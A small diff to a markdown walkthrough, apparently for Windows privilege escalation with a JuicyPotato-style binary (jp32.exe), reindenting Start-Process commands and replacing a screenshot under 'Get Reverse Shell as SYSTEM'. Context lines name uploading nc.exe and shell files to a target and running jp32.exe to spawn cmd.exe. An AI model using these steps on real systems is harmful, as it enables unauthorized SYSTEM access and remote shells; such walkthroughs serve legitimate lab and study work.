@@ -80,8 +80,8 @@ Now upload jp32.exe, test.bat, CLSID.list, shell.bat or shell.exe / nc.exe to th
 
 Now execute the test.bat
         
-        powershell Start-Process c:\Users\Bob\Desktop\test.bat  (if not in powershell)                                                           
-        Start-Process c:\Users\Bob\Desktop\test.bat             (if in powershell) 
+   powershell Start-Process c:\Users\Bob\Desktop\test.bat  (if not in powershell)                                                           
+   Start-Process c:\Users\Bob\Desktop\test.bat             (if in powershell) 
         
  Now wait for 5-mins you will see result.log file is created type the file you gonna see bunch of CLSID.
  
@@ -121,6 +121,7 @@ c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/
 
 ## Get Reverse Shell as SYSTEM
 
-![OnPaste 20220606-195431](https://user-images.githubusercontent.com/106917304/172180726-4bdb1672-1a35-4e06-8458-a873b49c6926.png)
+![OnPaste 20220607-122743](https://user-images.githubusercontent.com/106917304/172315942-28946d1d-3a1f-45d5-ac1a-5ca03df1544b.png)
+
 
 
